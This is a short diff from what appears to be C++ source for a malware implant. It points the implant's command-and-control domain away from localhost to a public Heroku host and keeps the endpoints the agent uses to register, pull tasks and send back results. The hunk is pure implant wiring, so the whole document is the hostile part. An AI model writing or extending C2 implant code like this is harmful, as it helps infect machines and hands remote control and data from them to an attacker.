@@ -10,7 +10,7 @@
 using json = nlohmann::json;
 
 // implant configurations
-LPCWSTR c2Domain = L"127.0.0.1";
+LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
 LPCWSTR registerURI = L"/agent/register";
 LPCWSTR getTaskURI = L"/agent/get_task";
 LPCWSTR sendResultURI = L"agent/send_result";
